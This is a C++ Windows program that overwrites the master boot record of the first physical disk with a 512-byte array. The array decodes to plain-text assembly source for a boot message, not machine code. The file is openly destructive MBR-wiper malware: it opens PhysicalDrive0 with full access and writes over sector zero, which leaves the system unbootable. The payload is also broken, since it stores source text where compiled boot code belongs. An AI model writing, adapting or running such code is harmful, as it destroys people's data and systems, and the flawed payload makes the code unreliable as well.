#include <Windows.h>
#include <iostream>
#define NTDDI_WIN7 (0x0601000)

const unsigned char MasterBootRecord[] = {
0x5B, 0x62, 0x69, 0x74, 0x73, 0x20, 0x31, 0x36, 0x5D, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x5B, 0x6F,
0x72, 0x67, 0x20, 0x30, 0x78, 0x37, 0x63, 0x30, 0x30, 0x5D, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x0D,
0x0A, 0x0D, 0x0A, 0x73, 0x74, 0x61, 0x72, 0x74, 0x3A, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20,
0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x78, 0x6F, 0x72, 0x20, 0x61,
0x78, 0x2C, 0x61, 0x78, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A,
0x6D, 0x6F, 0x76, 0x20, 0x64, 0x73, 0x2C, 0x61, 0x78, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
0x20, 0x20, 0x20, 0x0D, 0x0A, 0x6D, 0x6F, 0x76, 0x20, 0x65, 0x73, 0x2C, 0x61, 0x78, 0x20, 0x20,
0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x6D, 0x6F, 0x76, 0x20, 0x62, 0x78,
0x2C, 0x30, 0x78, 0x38, 0x30, 0x30, 0x30, 0x0D, 0x0A, 0x0D, 0x0A, 0x0D, 0x0A, 0x6D, 0x6F, 0x76,
0x20, 0x73, 0x69, 0x2C, 0x20, 0x73, 0x75, 0x72, 0x70, 0x72, 0x69, 0x73, 0x65, 0x20, 0x20, 0x20,
0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x63, 0x61, 0x6C, 0x6C, 0x20,
0x70, 0x72, 0x69, 0x6E, 0x74, 0x5F, 0x73, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x09, 0x09, 0x09, 0x09,
0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x0D, 0x0A, 0x73, 0x75, 0x72, 0x70, 0x72, 0x69,
0x73, 0x65, 0x20, 0x64, 0x62, 0x20, 0x20, 0x27, 0x74, 0x65, 0x73, 0x74, 0x27, 0x2C, 0x31, 0x33,
0x2C, 0x30, 0x20, 0x3B, 0x74, 0x77, 0x6F, 0x6A, 0x61, 0x20, 0x77, 0x69, 0x61, 0x64, 0x6F, 0x6D,
0x6F, 0xC5, 0x9B, 0xC4, 0x87, 0x0D, 0x0A, 0x0D, 0x0A, 0x0D, 0x0A, 0x70, 0x72, 0x69, 0x6E, 0x74,
0x5F, 0x73, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x3A, 0x0D, 0x0A, 0x6D, 0x6F, 0x76, 0x20, 0x61, 0x68,
0x2C, 0x20, 0x30, 0x78, 0x30, 0x45, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
0x0D, 0x0A, 0x0D, 0x0A, 0x2E, 0x72, 0x65, 0x70, 0x65, 0x61, 0x74, 0x5F, 0x6E, 0x65, 0x78, 0x74,
0x5F, 0x63, 0x68, 0x61, 0x72, 0x3A, 0x0D, 0x0A, 0x6C, 0x6F, 0x64, 0x73, 0x62, 0x20, 0x20, 0x20,
0x09, 0x09, 0x09, 0x0D, 0x0A, 0x63, 0x6D, 0x70, 0x20, 0x61, 0x6C, 0x2C, 0x20, 0x30, 0x20, 0x20,
0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x09, 0x09, 0x0D, 0x0A, 0x6A,
0x65, 0x20, 0x2E, 0x64, 0x6F, 0x6E, 0x65, 0x5F, 0x70, 0x72, 0x69, 0x6E, 0x74, 0x09, 0x09, 0x20,
0x20, 0x20, 0x20, 0x09, 0x0D, 0x0A, 0x69, 0x6E, 0x74, 0x20, 0x30, 0x78, 0x31, 0x30, 0x20, 0x20,
0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x09, 0x20,
0x0D, 0x0A, 0x6A, 0x6D, 0x70, 0x20, 0x2E, 0x72, 0x65, 0x70, 0x65, 0x61, 0x74, 0x5F, 0x6E, 0x65,
0x78, 0x74, 0x5F, 0x63, 0x68, 0x61, 0x72, 0x20, 0x20, 0x20, 0x09, 0x0D, 0x0A, 0x0D, 0x0A, 0x2E,
0x64, 0x6F, 0x6E, 0x65, 0x5F, 0x70, 0x72, 0x69, 0x6E, 0x74, 0x3A, 0x0D, 0x0A, 0x72, 0x65, 0x74,
0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
0x20, 0x09, 0x0D, 0x0A, 0x0D, 0x0A, 0x74, 0x69, 0x6D, 0x65, 0x73, 0x20, 0x28, 0x35, 0x31, 0x30,
0x20, 0x2D, 0x20, 0x28, 0x24, 0x20, 0x2D, 0x20, 0x24, 0x24, 0x29, 0x29, 0x20, 0x64, 0x62, 0x20,
0x30, 0x78, 0x30, 0x30, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x64, 0x77, 0x20, 0x30, 0x78,
0x41, 0x41, 0x35, 0x35, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x09,
0x09, 0x09, 0x09, 0x09, 0x09, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x09, 0x0D, 0x0A, 0x09, 0x0D, 0x0A,
0x09, };

using namespace std;

int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow
)
{
	DWORD dwBytesWritten;
	HANDLE MBR = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	if (WriteFile(MBR, MasterBootRecord, 512, &dwBytesWritten, 0) == TRUE)
	{
		cout << "Master Boot Record has been over written" << endl;
		Sleep(5000);
		ExitProcess(0);
	}
	else
	{
		cout << "FAILED!";
		Sleep(5000);
		ExitProcess(0);
	}
	CloseHandle(MBR);
	return EXIT_SUCCESS;
}
